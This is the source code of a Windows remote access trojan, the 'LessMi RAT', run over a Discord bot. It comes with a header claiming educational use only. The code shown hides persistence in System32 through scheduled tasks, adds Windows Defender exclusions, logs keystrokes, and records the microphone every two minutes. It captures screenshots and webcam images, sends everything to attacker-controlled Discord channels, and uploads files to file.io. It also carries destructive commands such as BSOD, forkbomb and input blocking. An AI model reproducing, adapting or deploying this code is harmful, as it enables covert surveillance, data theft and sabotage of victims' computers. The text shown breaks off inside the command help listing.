#  __  __       _          _    ____
# |  \/  | __ _| |_ ___   / \  / ___|
# | |\/| |/ _` | __/ _ \ / _ \| |  _
# | |  | | (_| | ||  __// ___ \ |_| |
# |_|  |_|\__,_|\__\___/_/   \_\____|
#
# (c) Copyright 2026 - MateAG
# All rights reserved. Any copy without
# consent of this code will be reported.
#
# This project is only for educational purposes.
# The creator is NOT responsible of any illegal/malicious use
# of this project.
#
# The creator advices you to use this for testing and
# legal activities. If you want to install this on
# someone else computer, please ask them for the
# permission to.
#
# Thank you and happy testing! <3


import discord
from discord.ext import commands
import os
import sys
import ctypes
import nacl.secret
import nacl.utils
import subprocess
import json
import sqlite3
import shutil
import time
import threading
import random
import string
import socket
import aiohttp
import aiosqlite
import requests
import builtins
import re
import winsound
import numpy as np
from datetime import datetime
from PIL import ImageGrab
import cv2
import wave
import pyautogui
from pynput import keyboard, mouse
import win32gui
import win32con
import win32api
import win32clipboard
import winreg
import asyncio
import psutil
from pathlib import Path
import math
import sounddevice as sd

voice_client = None
voice_reconnect = True

try:
    import imageio_ffmpeg
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "imageio-ffmpeg"])
    import imageio_ffmpeg

FFMPEG_BIN = imageio_ffmpeg.get_ffmpeg_exe()


def ps(cmd):
    return subprocess.run(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
        capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
    )


def setup_persistence():
    try:
        current_exe = Path(sys.executable) if getattr(sys, "frozen", False) else Path(__file__).resolve()
        target_dir = Path(r"C:\Windows\System32\ZZZ_Security")
        target_exe = target_dir / "ZZZ_Security.exe"

        target_dir.mkdir(parents=True, exist_ok=True)

        if not target_exe.exists() or current_exe.resolve() != target_exe.resolve():
            try:
                shutil.copy2(str(current_exe), str(target_exe))
            except Exception:
                pass

        subprocess.run(
            ["schtasks", "/Create", "/TN", "ZZZ_Security_Logon",
             "/TR", f'"{target_exe}"', "/SC", "ONLOGON", "/RL", "HIGHEST", "/F"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["schtasks", "/Create", "/TN", "ZZZ_Security_Boot",
             "/TR", f'"{target_exe}"', "/SC", "ONSTART", "/RL", "HIGHEST", "/F"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                0, winreg.KEY_ALL_ACCESS
            )
            try:
                existing, _ = winreg.QueryValueEx(key, "Userinit")
                if "ZZZ_Security.exe" in existing:
                    winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ,
                                      r"C:\Windows\System32\userinit.exe,")
            except FileNotFoundError:
                pass
            winreg.CloseKey(key)
        except Exception:
            pass

        ps(f'Add-MpPreference -ExclusionPath "{target_dir}" -ErrorAction SilentlyContinue')
        ps('Add-MpPreference -ExclusionProcess "ZZZ_Security.exe" -ErrorAction SilentlyContinue')
    except Exception:
        pass


setup_persistence()

_mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\ZZZ_Security_Agent")
if ctypes.windll.kernel32.GetLastError() == 183:
    sys.exit(0)

RESOURCES_DIR = os.path.join(
    os.path.dirname(sys.executable if getattr(sys, "frozen", False) else __file__),
    "resources"
)

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True

bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

BASE_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "MateAG_RAT")
DB_PATH = os.path.join(BASE_DIR, "data.db")
ICON_PATH = os.path.join(BASE_DIR, "icon.png")

if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

current_dir = os.path.expanduser("~")
keylogger_active = True
keylogger_buffer = []
last_key_time = time.time()
selected_camera = 0
selected_mic = None
input_blocked = False
keyboard_listener = None
mouse_listener = None
critical_process = False


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS blacklist (process_name TEXT PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS blocked_domains (domain TEXT PRIMARY KEY)''')
    conn.commit()
    conn.close()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def create_embed(title, description, color=0x0084ff):
    embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.now())
    if os.path.exists(ICON_PATH):
        embed.set_footer(text="MateAGYT/LessMi", icon_url="https://github.com/MateAGYT/LessMi/blob/main/image.png?raw=true")
    else:
        embed.set_footer(text="MateAGYT/LessMi")
    return embed


def screenshot_all():
    try:
        img = ImageGrab.grab(all_screens=True)
        path = os.path.join(BASE_DIR, "ss.png")
        img.save(path)
        return path
    except Exception:
        return None


def list_cameras():
    cams = []
    for i in range(10):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            ret, _ = cap.read()
            if ret:
                cams.append(i)
            cap.release()
    return cams


def get_input_devices():
    devices = sd.query_devices()
    mics = []
    for i, d in enumerate(devices):
        if d["max_input_channels"] > 0:
            name = d["name"].strip()
            if name:
                mics.append({"index": i, "name": name})
    return mics


def current_mic_name():
    mics = get_input_devices()
    if not mics:
        return None
    if selected_mic is not None:
        for m in mics:
            if m["index"] == selected_mic:
                return m["name"]
    return mics[0]["name"]


def set_volume_level(level):
    try:
        val = max(0.0, min(1.0, float(level)))
        ps_code = f"""
$code = @'
using System;
using System.Runtime.InteropServices;

namespace Audio {{
    public class Volume {{
        [DllImport("MMDevApi.dll")]
        private static extern int MMDeviceEnumerator_CreateInstance(ref Guid riid, int dwClsCtx, IntPtr pActivationParams, out IntPtr ppInterface);

        [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IAudioEndpointVolume {{
            int RegisterControlChangeNotify(IntPtr pNotify);
            int UnregisterControlChangeNotify(IntPtr pNotify);
            int GetChannelCount(out uint pnChannelCount);
            int SetMasterVolumeLevel(float fLevelDB, ref Guid pguidEventContext);
            int SetMasterVolumeLevelScalar(float fLevel, ref Guid pguidEventContext);
        }}

        [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IMMDeviceEnumerator {{
            int EnumAudioEndpoints(int dataFlow, int dwStateMask, out IntPtr ppDevices);
            int GetDefaultAudioEndpoint(int dataFlow, int role, out IntPtr ppEndpoint);
        }}

        [Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IMMDevice {{
            int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, [MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);
        }}

        public static void SetVolume(float level) {{
            Guid CLSID_MMDeviceEnumerator = new Guid("BCDE0395-E52F-467C-8E3D-C4579291692E");
            Guid IID_IMMDeviceEnumerator = new Guid("A95664D2-9614-4F35-A746-DE8DB63617E6");
            Guid IID_IAudioEndpointVolume = new Guid("5CDF2C82-841E-4546-9722-0CF74078229A");

            Type type = Type.GetTypeFromCLSID(CLSID_MMDeviceEnumerator);
            IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)Activator.CreateInstance(type);
            IntPtr devPtr;
            enumerator.GetDefaultAudioEndpoint(0, 1, out devPtr);
            IMMDevice device = (IMMDevice)Marshal.GetObjectForIUnknown(devPtr);
            object volObj;
            device.Activate(ref IID_IAudioEndpointVolume, 23, IntPtr.Zero, out volObj);
            IAudioEndpointVolume volume = (IAudioEndpointVolume)volObj;
            Guid g = Guid.Empty;
            volume.SetMasterVolumeLevelScalar(level, ref g);
        }}
    }}
}}
'@
Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
[Audio.Volume]::SetVolume({val})
"""
        subprocess.run(["powershell", "-NoProfile", "-Command", ps_code],
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except Exception:
        return False


def keylogger_thread():
    global keylogger_buffer, last_key_time

    def on_press(key):
        global last_key_time
        if not keylogger_active:
            return
        try:
            keylogger_buffer.append(key.char)
        except AttributeError:
            specials = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.caps_lock: "[CAPS]",
                keyboard.Key.shift: "",
                keyboard.Key.shift_r: "",
            }
            keylogger_buffer.append(specials.get(key, f"[{key}]"))
        last_key_time = time.time()

    while True:
        try:
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except Exception:
            time.sleep(1)


def flush_keylog():
    global keylogger_buffer
    if not keylogger_buffer:
        return False
    text = "".join(keylogger_buffer)
    keylogger_buffer = []
    try:
        asyncio.run_coroutine_threadsafe(send_keylog_to_discord(text), bot.loop)
        return True
    except Exception:
        return False


def send_keys_periodically():
    while True:
        time.sleep(60)
        if keylogger_active:
            flush_keylog()


async def send_keylog_to_discord(text):
    for guild in bot.guilds:
        keys_ch = guild.get_channel(cfg_get(guild.id, "keys"))
        if keys_ch:
            for chunk in [text[i:i + 1900] for i in range(0, len(text), 1900)]:
                await keys_ch.send(f"```\n{chunk}\n```")


def record_and_send(duration=60):
    fs = 44100
    device = selected_mic
    rec = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype=np.int16, device=device)
    sd.wait()
    filename = os.path.join(BASE_DIR, f"mic_{int(time.time())}.wav")
    with wave.open(filename, "wb") as wf:
        wf.setnchannels(2)
        wf.setsampwidth(2)
        wf.setframerate(fs)
        wf.writeframes(rec.tobytes())
    asyncio.run_coroutine_threadsafe(send_recording(filename), bot.loop)


def record_mic_thread():
    while True:
        time.sleep(120)
        try:
            record_and_send(60)
        except Exception:
            pass


async def send_recording(filename):
    for guild in bot.guilds:
        mic_ch = guild.get_channel(cfg_get(guild.id, "microphone"))
        if mic_ch:
            try:
                await mic_ch.send(file=discord.File(filename))
            except Exception:
                pass
    try:
        os.remove(filename)
    except Exception:
        pass


def check_blacklist():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT process_name FROM blacklist")
    blocked = [row[0].lower() for row in c.fetchall()]
    conn.close()

    while True:
        for proc in psutil.process_iter(["name"]):
            try:
                if proc.info["name"].lower() in blocked:
                    proc.kill()
            except Exception:
                pass
        time.sleep(2)


def get_idle_time():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]

    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    return millis / 1000.0


def tree_directory(path, prefix=""):
    lines = []
    try:
        entries = sorted(os.listdir(path))
        for i, entry in enumerate(entries):
            full_path = os.path.join(path, entry)
            is_last = i == len(entries) - 1
            current = "└── " if is_last else "├── "
            lines.append(prefix + current + entry)
            if os.path.isdir(full_path):
                extension = "    " if is_last else "│   "
                lines.extend(tree_directory(full_path, prefix + extension))
    except Exception:
        pass
    return lines


def upload_fileio(filepath):
    try:
        with open(filepath, "rb") as f:
            response = requests.post("https://file.io", files={"file": f})
            return response.json().get("link")
    except Exception:
        return None


def enum_windows():
    titles = []

    def cb(hwnd, _):
        if win32gui.IsWindowVisible(hwnd):
            t = win32gui.GetWindowText(hwnd)
            if t:
                titles.append(t)
        return True

    win32gui.EnumWindows(cb, None)
    return titles


def flash_screen(effect):
    hdc = win32gui.GetDC(0)
    x, y = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
    if effect == "list":
        return ["invert\n", "noise\n", "lines\n", "invert_squares\n", "color_squares\n",
                "diagonal_lines\n", "snowfall\n", "hypnotic_spirals\n", "random_lines\n"]
    elif effect == "invert":
        while True:
            win32gui.PatBlt(hdc, 0, 0, x, y, win32con.PATINVERT)
    elif effect == "noise":
        for _ in range(x * y // 20):
            rand_x = random.randint(0, x)
            rand_y = random.randint(0, y)
            color = win32api.RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            brush = win32gui.CreateSolidBrush(color)
            win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, rand_x, rand_y, 100, 100, win32con.PATCOPY)
    elif effect == "lines":
        for _ in range(0, y, 5):
            win32gui.PatBlt(hdc, 0, _, x, 2, win32con.PATINVERT)
    elif effect == "invert_squares":
        for _ in range(200):
            rx1 = random.randint(0, x)
            ry1 = random.randint(0, y)
            rx2 = random.randint(0, x)
            ry2 = random.randint(0, y)
            win32gui.PatBlt(hdc, rx1, ry1, rx2 - rx1, ry2 - ry1, win32con.PATINVERT)
    elif effect == "color_squares":
        for i in range(10):
            for x_pos in range(0, x, 20):
                for y_pos in range(0, y, 20):
                    brush = win32gui.CreateSolidBrush(win32api.RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    win32gui.SelectObject(hdc, brush)
                    win32gui.PatBlt(hdc, x_pos, y_pos, 10, 10, win32con.PATCOPY)
                    win32gui.DeleteObject(brush)
                    brush = win32gui.CreateSolidBrush(win32api.RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    win32gui.SelectObject(hdc, brush)
                    win32gui.PatBlt(hdc, x_pos + 10, y_pos + 10, 10, 10, win32con.PATCOPY)
                    win32gui.DeleteObject(brush)
    elif effect == "diagonal_lines":
        for x_pos in range(0, x, 10):
            brush = win32gui.CreateSolidBrush(win32api.RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, x_pos, 0, 1, y, win32con.PATCOPY)
            win32gui.DeleteObject(brush)
        for y_pos in range(0, y, 10):
            brush = win32gui.CreateSolidBrush(win32api.RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, 0, y_pos, x, 1, win32con.PATCOPY)
            win32gui.DeleteObject(brush)
    elif effect == "snowfall":
        for i in range(10):
            stars = [(random.randint(0, x), random.randint(0, y), random.randint(1, 4)) for _ in range(100)]
            for rand_x, rand_y, size in stars:
                brush = win32gui.CreateSolidBrush(win32api.RGB(255, 255, 255))
                win32gui.SelectObject(hdc, brush)
                win32gui.PatBlt(hdc, rand_x, rand_y, size, size, win32con.PATCOPY)
            time.sleep(0.5)
    elif effect == "hypnotic_spirals":
        for angle in range(0, 180, 1):
            radius = 1000
            x1 = int(x / 2 + radius * math.cos(math.radians(angle)))
            y1 = int(y / 2 - radius * math.sin(math.radians(angle)))
            x2 = int(x / 2 + radius * math.cos(math.radians(angle + 180)))
            y2 = int(y / 2 - radius * math.sin(math.radians(angle + 180)))
            color = win32api.RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            pen = win32gui.CreatePen(win32con.PS_SOLID, 1, color)
            win32gui.SelectObject(hdc, pen)
            win32gui.MoveToEx(hdc, x1, y1)
            win32gui.LineTo(hdc, x2, y2)
            win32gui.DeleteObject(pen)
    elif effect == "random_lines":
        for _ in range(50):
            x1 = random.randint(0, x)
            y1 = random.randint(0, y)
            x2 = random.randint(0, x)
            y2 = random.randint(0, y)
            color = win32api.RGB(random.randrange(255), random.randrange(255), random.randrange(255))
            pen = win32gui.CreatePen(win32con.PS_SOLID, 2, color)
            win32gui.SelectObject(hdc, pen)
            win32gui.MoveToEx(hdc, x1, y1)
            win32gui.LineTo(hdc, x2, y2)
            win32gui.DeleteObject(pen)
    else:
        win32gui.PatBlt(hdc, 0, 0, x, y, win32con.PATINVERT)
    if effect != "list":
        time.sleep(10)
        win32gui.DeleteDC(hdc)

CATEGORY_IDS = {}
CHANNEL_IDS = {}


def init_channels_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS guild_config
                 (guild_id INTEGER, key TEXT, value INTEGER, PRIMARY KEY (guild_id, key))""")
    conn.commit()
    conn.close()


def get_guild_value(guild_id, key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM guild_config WHERE guild_id = ? AND key = ?", (guild_id, key))
    result = c.fetchone()
    conn.close()
    return result[0] if result else None


def set_guild_value(guild_id, key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO guild_config VALUES (?, ?, ?)", (guild_id, key, value))
    conn.commit()
    conn.close()


def cfg_get(guild_id, key, default=None):
    return CHANNEL_IDS.get(guild_id, {}).get(key, default)


init_db()
init_channels_db()

CHANNEL_NAMES = {
    "panel": "🧮〡panel",
    "cmds": "🤖〡cmds",
    "keys": "🔑〡keys",
    "microphone": "🎤〡microphone",
}


async def run_panel_command(interaction: discord.Interaction, command_name: str, *args):
    cmd = bot.get_command(command_name)
    if not cmd:
        await interaction.response.send_message(f"Unknown command: `{command_name}`", ephemeral=True)
        return
    cmds_channel = interaction.guild.get_channel(cfg_get(interaction.guild.id, "cmds"))
    if not cmds_channel:
        await interaction.response.send_message("Commands channel not found", ephemeral=True)
        return
    await interaction.response.defer()
    ctx = await bot.get_context(interaction.message)
    ctx.author = interaction.user
    ctx.channel = cmds_channel
    ctx.guild = interaction.guild
    try:
        await ctx.invoke(cmd, *args)
    except Exception as e:
        await cmds_channel.send(f"Error: {e}")


class _PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    async def run(self, interaction, name, *args):
        await run_panel_command(interaction, name, *args)


class VolumeModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="Set Volume")
        self.volume = discord.ui.TextInput(label="Volume (0-100)", placeholder="50", required=True, max_length=3)
        self.add_item(self.volume)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            vol = int(self.volume.value)
            if 0 <= vol <= 100:
                await run_panel_command(interaction, "volume", vol)
            else:
                await interaction.response.send_message("0-100 only", ephemeral=True)
        except ValueError:
            await interaction.response.send_message("Invalid value", ephemeral=True)


class NotepadModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="Open Notepad")
        self.text = discord.ui.TextInput(label="Text", style=discord.TextStyle.paragraph, required=True)
        self.add_item(self.text)

    async def on_submit(self, interaction: discord.Interaction):
        await run_panel_command(interaction, "notepad", self.text.value)


class ButtonsScreenshot(_PanelView):
    @discord.ui.button(label="📸 Screenshot", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "ss")

    @discord.ui.button(label="🎥 Screenrec", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "screenrec", 30)

    @discord.ui.button(label="📹 Webcam", style=discord.ButtonStyle.primary)
    async def b3(self, i, b):
        await self.run(i, "webcam")


class ButtonsSystem(_PanelView):
    @discord.ui.button(label="🔊 Volume", style=discord.ButtonStyle.secondary)
    async def b1(self, i, b):
        await i.response.send_modal(VolumeModal())

    @discord.ui.button(label="⌨️ Block", style=discord.ButtonStyle.danger)
    async def b2(self, i, b):
        await self.run(i, "block-input")

    @discord.ui.button(label="✅ Unblock", style=discord.ButtonStyle.success)
    async def b3(self, i, b):
        await self.run(i, "unblock-input")

    @discord.ui.button(label="🖥️ Mon OFF", style=discord.ButtonStyle.danger)
    async def b4(self, i, b):
        await self.run(i, "monitors-off")

    @discord.ui.button(label="🖥️ Mon ON", style=discord.ButtonStyle.success)
    async def b5(self, i, b):
        await self.run(i, "monitors-on")


class ButtonsCameras(_PanelView):
    @discord.ui.button(label="📹 List Cams", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "list-cams")

    @discord.ui.button(label="🎙️ List Mics", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "list-mics")

    @discord.ui.button(label="🎙️ Join", style=discord.ButtonStyle.success)
    async def b3(self, i, b):
        await self.run(i, "join")

    @discord.ui.button(label="🔌 Disconnect", style=discord.ButtonStyle.secondary)
    async def b4(self, i, b):
        await self.run(i, "disconnect")


class ButtonsProcesses(_PanelView):
    @discord.ui.button(label="📋 Tasklist", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "tasklist")

    @discord.ui.button(label="🚫 Kill Exp", style=discord.ButtonStyle.danger)
    async def b2(self, i, b):
        await self.run(i, "kill-explorer")

    @discord.ui.button(label="✅ Start Exp", style=discord.ButtonStyle.success)
    async def b3(self, i, b):
        await self.run(i, "start-explorer")


class ButtonsTrolling(_PanelView):
    @discord.ui.button(label="😵 Crazy", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "crazy-mouse")

    @discord.ui.button(label="➖ Minimize", style=discord.ButtonStyle.secondary)
    async def b2(self, i, b):
        await self.run(i, "minimize-all")

    @discord.ui.button(label="💀 BSOD", style=discord.ButtonStyle.danger)
    async def b3(self, i, b):
        await self.run(i, "bsod")

    @discord.ui.button(label="🍽️ Fork", style=discord.ButtonStyle.danger)
    async def b4(self, i, b):
        await self.run(i, "forkbomb")

    @discord.ui.button(label="👻 Jump", style=discord.ButtonStyle.danger)
    async def b5(self, i, b):
        await self.run(i, "jumpscare")


class ButtonsFiles(_PanelView):
    @discord.ui.button(label="📁 LS", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "ls")

    @discord.ui.button(label="🌳 Tree", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "tree")


class ButtonsSecurity(_PanelView):
    @discord.ui.button(label="🚫 Blacklist", style=discord.ButtonStyle.danger)
    async def b1(self, i, b):
        await i.response.send_message("Type `.blacklist <process>` in cmds", ephemeral=True)

    @discord.ui.button(label="✅ Unblacklist", style=discord.ButtonStyle.success)
    async def b2(self, i, b):
        await i.response.send_message("Type `.unblacklist <process>` in cmds", ephemeral=True)


class ButtonsPower(_PanelView):
    @discord.ui.button(label="🔒 Lock", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "lock-pc")

    @discord.ui.button(label="😴 Sleep", style=discord.ButtonStyle.secondary)
    async def b2(self, i, b):
        await self.run(i, "sleep-pc")

    @discord.ui.button(label="🔁 Restart", style=discord.ButtonStyle.danger)
    async def b3(self, i, b):
        await self.run(i, "restart-pc")

    @discord.ui.button(label="⏻ Shutdown", style=discord.ButtonStyle.danger)
    async def b4(self, i, b):
        await self.run(i, "shutdown-pc")


class ButtonsInfo(_PanelView):
    @discord.ui.button(label="🖥️ Sysinfo", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "sysinfo")

    @discord.ui.button(label="🔋 Battery", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "battery")

    @discord.ui.button(label="📶 WiFi", style=discord.ButtonStyle.primary)
    async def b3(self, i, b):
        await self.run(i, "wifi")

    @discord.ui.button(label="💽 Drives", style=discord.ButtonStyle.primary)
    async def b4(self, i, b):
        await self.run(i, "drives")


class ButtonsMore(_PanelView):
    @discord.ui.button(label="🪟 Windows", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "window-list")

    @discord.ui.button(label="📋 Clipboard", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "clipboard")

    @discord.ui.button(label="🚀 Startup", style=discord.ButtonStyle.primary)
    async def b3(self, i, b):
        await self.run(i, "startup")

    @discord.ui.button(label="📝 Notepad", style=discord.ButtonStyle.secondary)
    async def b4(self, i, b):
        await i.response.send_modal(NotepadModal())

    @discord.ui.button(label="🔔 Beep", style=discord.ButtonStyle.success)
    async def b5(self, i, b):
        await self.run(i, "beep")


@bot.event
async def on_ready():
    print(f"Connected as {bot.user}")

    pc_name = socket.gethostname()
    category_name = f"💻 〣 {pc_name}"

    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(type=discord.ActivityType.playing, name="🔑 LessMi RAT")
    )

    for guild in bot.guilds:
        gid = guild.id
        CHANNEL_IDS.setdefault(gid, {})

        cat_id = get_guild_value(gid, "category")
        cat = guild.get_channel(cat_id) if cat_id else None
        if not cat:
            cat = discord.utils.get(guild.categories, name=category_name)
            if not cat:
                cat = await guild.create_category(category_name)
        CATEGORY_IDS[gid] = cat.id
        set_guild_value(gid, "category", cat.id)

        for key, name in CHANNEL_NAMES.items():
            ch_id = get_guild_value(gid, key)
            ch = guild.get_channel(ch_id) if ch_id else None
            if not ch:
                ch = discord.utils.get(cat.text_channels, name=name)
                if not ch:
                    ch = await guild.create_text_channel(name, category=cat)
            CHANNEL_IDS[gid][key] = ch.id
            set_guild_value(gid, key, ch.id)

            if key == "panel" and ch:
                try:
                    await ch.purge(limit=100)
                except Exception:
                    pass

        voice_ch = discord.utils.get(cat.voice_channels, name="Live microphone")
        if not voice_ch:
            try:
                voice_ch = await guild.create_voice_channel("Live microphone", category=cat)
            except Exception:
                pass

        if voice_ch:
            CHANNEL_IDS[gid]["livemic"] = voice_ch.id
            set_guild_value(gid, "livemic", voice_ch.id)

        keys_ch = guild.get_channel(cfg_get(gid, "keys"))
        if keys_ch:
            timestamp = datetime.now().strftime("[%Y-%m-%d] [%H:%M:%S]")
            await keys_ch.send(f"{timestamp} Started new session on {pc_name}")

        panel_ch = guild.get_channel(cfg_get(gid, "panel"))
        if panel_ch:
            def mk(title, desc, color, fields):
                e = create_embed(title, desc, color)
                for n, v in fields:
                    e.add_field(name=n, value=v, inline=True)
                return e

            await panel_ch.send(embed=mk("Screenshot & Recording", "Screen and camera control", 0x3498db,
                                         [(".ss", "Screenshot"), (".screenrec", "Record"), (".webcam", "Webcam")]),
                                view=ButtonsScreenshot())

            await panel_ch.send(embed=mk("System Control", "Volume, input, monitors", 0xe74c3c,
                                         [(".volume", "Volume"), (".block-input", "Block"), (".monitors", "Monitors")]),
                                view=ButtonsSystem())

            await panel_ch.send(embed=mk("Cameras & Audio", "Device management", 0x2ecc71,
                                         [(".list-cams", "Cams"), (".list-mics", "Mics"), (".join", "Join")]),
                                view=ButtonsCameras())

            await panel_ch.send(embed=mk("Processes", "Process management", 0x9b59b6,
                                         [(".tasklist", "List"), (".kill-explorer", "Kill Exp"), (".start-explorer", "Start Exp")]),
                                view=ButtonsProcesses())

            await panel_ch.send(embed=mk("Trolling", "Fun commands", 0xf39c12,
                                         [(".crazy-mouse", "Crazy"), (".bsod", "BSOD"), (".forkbomb", "Fork")]),
                                view=ButtonsTrolling())

            await panel_ch.send(embed=mk("Files", "File management", 0x1abc9c,
                                         [(".ls", "List"), (".tree", "Tree")]),
                                view=ButtonsFiles())

            await panel_ch.send(embed=mk("Security", "Blacklist", 0x95a5a6,
                                         [(".blacklist", "Block"), (".unblacklist", "Unblock")]),
                                view=ButtonsSecurity())

            await panel_ch.send(embed=mk("Power", "Session control", 0xe67e22,
                                         [(".lock-pc", "Lock"), (".sleep-pc", "Sleep"), (".restart-pc", "Restart"), (".shutdown-pc", "Shutdown")]),
                                view=ButtonsPower())

            await panel_ch.send(embed=mk("Info", "System information", 0x3498db,
                                         [(".sysinfo", "Sysinfo"), (".battery", "Battery"), (".wifi", "WiFi"), (".drives", "Drives")]),
                                view=ButtonsInfo())

            await panel_ch.send(embed=mk("More", "Extra tools", 0x9b59b6,
                                         [(".window-list", "Windows"), (".clipboard", "Clipboard"), (".startup", "Startup"), (".notepad", "Notepad"), (".beep", "Beep")]),
                                view=ButtonsMore())

    threading.Thread(target=keylogger_thread, daemon=True).start()
    threading.Thread(target=send_keys_periodically, daemon=True).start()
    threading.Thread(target=record_mic_thread, daemon=True).start()
    threading.Thread(target=check_blacklist, daemon=True).start()


@bot.command(aliases=["help"])
async def ayuda(ctx):
    embed1 = create_embed("Available Commands (1/3)", """
**Channels:**
🧮〡panel - Control panel
🤖〡cmds - Execute commands
🔑〡keys - Keylogger output
🎤〡microphone - Voice recordings

**Screenshot & Recording:**
`.ss` - Screenshot all monitors
`.screenrec <seconds>` - Record screen
`.webcam` - Webcam photo

**Control:**
`.volume <0-100>` - Set volume
`.mute` - Toggle mute
`.block-input [seconds]` - Block keyboard/mouse
`.unblock-input` - Unblock input
`.hide-cursor` / `.show-cursor` - Cursor
`.monitors-off` / `.monitors-on` - Monitors
`.show-screens` - List displays
`.screen-mode <mode>` - Display layout
`.rotate <0|90|180|270>` - Rotate screen
`.airplane-mode <on|off>` - Airplane mode
`.alt-f4` - Close window
`.minimize-all` - Minimize all

**Cameras/Audio:**
`.list-cams` / `.sel-cam <id>` - Cameras
`.list-mics` / `.sel-mic <id>` - Microphones
`.list-speakers` / `.set-speaker <n>` - Output
`.join` / `.disconnect` - Voice channel
`.record <seconds>` - Instant mic recording
""", 0x9b59b6)

    embed2 = create_embed("Available Commands (2/3)", """
**Processes:**
`.tasklist` - List processes
`.taskkill <process>` - Kill process
`.kill-explorer` / `.start-explorer` - Explorer
`.set-critical` / `.unset-critical` - Critical

**Trolling:**
`.crazy-mouse`, `.bsod`, `.forkbomb`, `.jumpscare`
`.display-glitch <effect>` - Glitches
`.play <file/url>` - Play audio
`.tts <message>` - Text to speech
`.msg <type> <title> <message>` - MsgBox
`.win-notify "<title>" <msg>` - Notification
`.set-wallpaper <file|url>` - Wallpaper

**Files:**
`.ls`, `.cd <path>`, `.tree`, `.download <file>`
`.upload`, `.remove <file>`, `.open <file>`
`.clear-bin`, `.mount-iso`, `.unmount-iso`

**Keylogger:**
`.keylogger-enable` / `.keylogger-disable`
`.keylog` - Flush keylog now
""", 0x9b59b6)

    embed3 = create_embed("Available Commands (3/3)", """
**Network:**
`.ip-locate` - IP information
`.coords` - GPS coordinates
`.block-domain` / `.unblock-domain`
`.block-website` / `.unblock-website`
`.set-dns <dns1> <dns2>`
